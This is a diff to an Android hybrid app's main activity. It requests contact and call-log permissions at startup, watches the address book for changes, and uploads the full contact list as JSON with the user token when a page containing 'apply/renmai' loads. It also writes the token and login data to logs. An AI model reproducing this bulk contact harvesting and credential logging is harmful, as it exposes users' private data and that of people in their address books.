@@ -4,17 +4,21 @@ import android.Manifest;
 import android.app.Activity;
 import android.app.AlertDialog;
 import android.app.Service;
+import android.content.ContentResolver;
 import android.content.DialogInterface;
 import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.database.ContentObserver;
 import android.graphics.Bitmap;
 import android.media.AudioManager;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
+import android.provider.ContactsContract;
 import android.provider.Settings;
 import android.support.annotation.NonNull;
+import android.support.annotation.RequiresApi;
 import android.support.v4.app.ActivityCompat;
 import android.support.v4.content.ContextCompat;
 import android.text.TextUtils;
@@ -29,19 +33,16 @@ import android.widget.Toast;
 
 import com.alibaba.fastjson.JSON;
 import com.alibaba.fastjson.JSONArray;
-import com.fanwe.hybrid.activity.gesture.CreateGesturePasswordActivity;
 import com.fanwe.hybrid.bean.MyContacts;
 import com.fanwe.hybrid.constant.ApkConstant;
 import com.fanwe.hybrid.constant.Constant.JsFunctionName;
 import com.fanwe.hybrid.dao.InitActModelDao;
-import com.fanwe.hybrid.dao.LoginSuccessModelDao;
 import com.fanwe.hybrid.dialog.BotPhotoPopupView;
 import com.fanwe.hybrid.dialog.DialogCropPhoto.OnCropBitmapListner;
 import com.fanwe.hybrid.event.SDBaseEvent;
 import com.fanwe.hybrid.jshandler.AppJsHandler;
 import com.fanwe.hybrid.model.CutPhotoModel;
 import com.fanwe.hybrid.model.InitActModel;
-import com.fanwe.hybrid.model.LoginSuccessModel;
 import com.fanwe.hybrid.netstate.TANetWorkUtil;
 import com.fanwe.hybrid.utils.ContactUtils;
 import com.fanwe.hybrid.utils.IntentUtil;
@@ -111,13 +112,12 @@ public class MainActivity extends BaseActivity implements OnCropBitmapListner {
     private String user_token;
     private String jsonString;
     private JSONArray json;
+    private String data;
     private ArrayList<MyContacts> contactsArrayList;
     private int MY_PERMISSIONS_REQUEST = 0;
     String[] permissions = {
             Manifest.permission.READ_CONTACTS,
             Manifest.permission.READ_CALL_LOG,
-    };
-    String[] cameraPermissions = {
             Manifest.permission.CAMERA,
             Manifest.permission.READ_EXTERNAL_STORAGE,
             Manifest.permission.WRITE_EXTERNAL_STORAGE,
@@ -125,6 +125,8 @@ public class MainActivity extends BaseActivity implements OnCropBitmapListner {
     List<String> mPermissionList = new ArrayList<>();
 
     private boolean isLogout = false;
+    ContentResolver resolver = null;
+    Observer observer = null;
 
     /**
      * 销毁保存当前URL
@@ -180,26 +182,74 @@ public class MainActivity extends BaseActivity implements OnCropBitmapListner {
         x.view().inject(this);
 
         init();
-        checkCameraPermissions();
+        checkPermissions();
+
     }
 
     /**
      * 动态权限
      */
-    private void checkCameraPermissions() {
+    private void checkPermissions() {
         mPermissionList.clear();
-        for (int i = 0; i < cameraPermissions.length; i++) {
-            if (ContextCompat.checkSelfPermission(MainActivity.this, cameraPermissions[i])
+        //这里开始做动态权限管理(API23以上采用，所以请保证targetSdkVersion > 23)
+        //判断权限组：[READ_CONTACTS，READ_CALL_LOG] 是否在清单文件重注册
+        for (int i = 0; i < permissions.length; i++) {
+            if (ContextCompat.checkSelfPermission(MainActivity.this, permissions[i])
                     != PackageManager.PERMISSION_GRANTED) {
-                mPermissionList.add(cameraPermissions[i]);
+                mPermissionList.add(permissions[i]);
             }
         }
-        if (mPermissionList.isEmpty()) {//未授予的权限为空，表示都授予了
-            Logger.i("相机权限已授予");
+        if (mPermissionList.isEmpty()) {
+            //未授予的权限为空，表示都授予了
+            //Toast.makeText(MainActivity.this, "已经授权", Toast.LENGTH_LONG).show();
+            LogUtil.d("已经授权");
+            //权限请求成功 TAGHere
         } else {
             //请求权限方法
             String[] permissions = mPermissionList.toArray(new String[mPermissionList.size()]);//将List转为数组
             ActivityCompat.requestPermissions(MainActivity.this, permissions, MY_PERMISSIONS_REQUEST);
+
+        }
+    }
+
+    @RequiresApi(api = Build.VERSION_CODES.M)
+    private void checkContactsChange() {
+        System.out.println("1111111" + Build.VERSION.SDK_INT);
+//        System.out.println("2222222" + checkSelfPermission(Manifest.permission.READ_CONTACTS));
+        // Check the SDK version and whether the permission is already granted or not.
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
+            requestPermissions(new String[]{Manifest.permission.READ_CONTACTS}, MY_PERMISSIONS_REQUEST);
+            //After this point you wait for callback in onRequestPermissionsResult(int, String[], int[]) overriden method
+        } else {
+            /**
+             * //通讯录发生变化后的处理
+             */
+            //实例化Observer
+            observer = new Observer(new Handler());
+            //获取resolver
+            resolver = getContentResolver();
+            Uri uri = ContactsContract.Contacts.CONTENT_URI;
+
+            //注册Observer
+            resolver.registerContentObserver(uri, true, observer);
+            LogUtil.e("onPageStartedEnd：" + System.currentTimeMillis());
+        }
+    }
+
+    class Observer extends ContentObserver {
+
+        public Observer(Handler handler) {
+            super(handler);
+        }
+
+        @Override
+        public void onChange(boolean selfChange) {
+            super.onChange(selfChange);
+//            Toast.makeText(MainActivity.this,
+//                    "联系人列表发生变化", Toast.LENGTH_SHORT).show();
+            Logger.i("联系人列表发生变化");
+            //onchange 方法中添加Toast便于观察
+            SharedPreferencesUtils.setParam(MainActivity.this, "isUpdate", true);
         }
     }
 
@@ -341,51 +391,25 @@ public class MainActivity extends BaseActivity implements OnCropBitmapListner {
                     mCurrentUrl = url;
                 }
 
-                if (url.contains("phonebook/index")) {
-                    LogUtil.d("What Happen is " + SharedPreferencesUtils.getParam(MainActivity.this, "isUpdate", false));
-                    mPermissionList.clear();
-                    //这里开始做动态权限管理(API23以上采用，所以请保证targetSdkVersion > 23)
-                    //判断权限组：[READ_CONTACTS，READ_CALL_LOG] 是否在清单文件重注册
-                    for (int i = 0; i < permissions.length; i++) {
-                        if (ContextCompat.checkSelfPermission(MainActivity.this, permissions[i])
-                                != PackageManager.PERMISSION_GRANTED) {
-                            mPermissionList.add(permissions[i]);
+                if (url.contains("apply/renmai")) {
+                    //有权限
+                    if (ContextCompat.checkSelfPermission(MainActivity.this,
+                            Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
+                        Logger.i("53123");
+                        if ((Boolean) SharedPreferencesUtils.getParam(MainActivity.this, "isUpdate", true)) {
+                            //Toast.makeText(MainActivity.this, "已经授权", Toast.LENGTH_LONG).show();
+                            SharedPreferencesUtils.setParam(MainActivity.this, "isUpdate", false);
+                            LogUtil.d("已经授权");
+                            //权限请求成功 TAGHere
+                            contactsArrayList = ContactUtils.getAllContacts(MainActivity.this);
+                            json = new JSONArray();
+                            json.addAll(contactsArrayList);
+                            data = JSON.toJSONString(contactsArrayList);
+                            System.out.println("lsyyydata" + data);
+                            //加个""的处理交给后台
+                            MainHelper.getInstance().postContacts(MainActivity.this, data, user_token);
                         }
                     }
-                    if (mPermissionList.isEmpty()) {//未授予的权限为空，表示都授予了
-                        //Toast.makeText(MainActivity.this, "已经授权", Toast.LENGTH_LONG).show();
-                        LogUtil.d("已经授权");
-                        //权限请求成功 TAGHere
-                        contactsArrayList = ContactUtils.getAllContacts(MainActivity.this);
-                        json = new JSONArray();
-                        json.addAll(contactsArrayList);
-                        jsonString = JSON.toJSONString(contactsArrayList);
-                        System.out.println("lsyyy" + json);
-
-//            recordList = PhoneRecordUtils.getRecord(this);
-//            latest = (Long) SharedPreferencesUtils.getParam(this, "latest", 0L);
-//            update = (Boolean) SharedPreferencesUtils.getParam(this, "update", false);
-
-//            json2 = new JSONArray();
-//            json2.addAll(recordList);
-//            jsonString2 = JSON.toJSONString(recordList);
-//            System.out.println("2018/9/12yjsq" + jsonString2);
-
-                    } else {
-                        //请求权限方法
-                        String[] permissions = mPermissionList.toArray(new String[mPermissionList.size()]);//将List转为数组
-                        ActivityCompat.requestPermissions(MainActivity.this, permissions, MY_PERMISSIONS_REQUEST);
-                    }
-                    LogUtil.e("onPageStartedEnd：" + System.currentTimeMillis());
-                }
-                if ((Boolean) SharedPreferencesUtils.getParam(MainActivity.this, "isUpdate", false)) {
-                    view.evaluateJavascript("javascript:getPhoneBook(" + jsonString + ")", new com.tencent.smtt.sdk.ValueCallback<String>() {
-                        @Override
-                        public void onReceiveValue(String s) {
-                            System.out.println("successPhoneInfo:" + s);
-                        }
-                    });
-
                 }
 
 //                int versionCode = FPackageUtil.getPackageInfo().versionCode;
@@ -402,7 +426,7 @@ public class MainActivity extends BaseActivity implements OnCropBitmapListner {
                 view.evaluateJavascript("javascript:getToken()", new com.tencent.smtt.sdk.ValueCallback<String>() {
                     @Override
                     public void onReceiveValue(String s) {
-                        LogUtil.d("token:" + s);
+                        Logger.i("token:" + s);
                         user_token = s;
                     }
                 });
@@ -494,6 +518,7 @@ public class MainActivity extends BaseActivity implements OnCropBitmapListner {
                 Toast.makeText(getActivity(), toast, Toast.LENGTH_SHORT).show();
                 break;
             case UPDATE:
+                Logger.i("更新App----ZEROwolf");
                 MainHelper.getInstance().updateApp(MainActivity.this);
                 break;
             case EVENT_REFRESH_RELOAD:
@@ -505,16 +530,20 @@ public class MainActivity extends BaseActivity implements OnCropBitmapListner {
                 }
                 break;
             case EVENT_LOGIN_SUCCESS:
+
+                Logger.i("登陆成功");
+                Logger.i(String.valueOf(event.data));
+//                Logger.i(event.data[token]);
                 isLogout = false;
-                boolean is_open_adv = getResources().getBoolean(R.bool.is_open_gesture);
-                LoginSuccessModel loginSuccessModel = LoginSuccessModelDao.queryModelCurrentLogin();
-                if (loginSuccessModel != null) {
-                    if (is_open_adv && TextUtils.isEmpty(loginSuccessModel.getPatternpassword())) {
-                        Intent intent = new Intent(MainActivity.this, CreateGesturePasswordActivity.class);
-                        intent.putExtra(CreateGesturePasswordActivity.EXTRA_CODE, CreateGesturePasswordActivity.ExtraCodel.EXTRA_CODE_1);
-                        startActivity(intent);
-                    }
-                }
+//                boolean is_open_adv = getResources().getBoolean(R.bool.is_open_gesture);
+//                LoginSuccessModel loginSuccessModel = LoginSuccessModelDao.queryModelCurrentLogin();
+//                if (loginSuccessModel != null) {
+//                    if (is_open_adv && TextUtils.isEmpty(loginSuccessModel.getPatternpassword())) {
+//                        Intent intent = new Intent(MainActivity.this, CreateGesturePasswordActivity.class);
+//                        intent.putExtra(CreateGesturePasswordActivity.EXTRA_CODE, CreateGesturePasswordActivity.ExtraCodel.EXTRA_CODE_1);
+//                        startActivity(intent);
+//                    }
+//                }
                 break;
             case EVENT_LOGOUT_SUCCESS: //退出登录成功
                 isLogout = true;
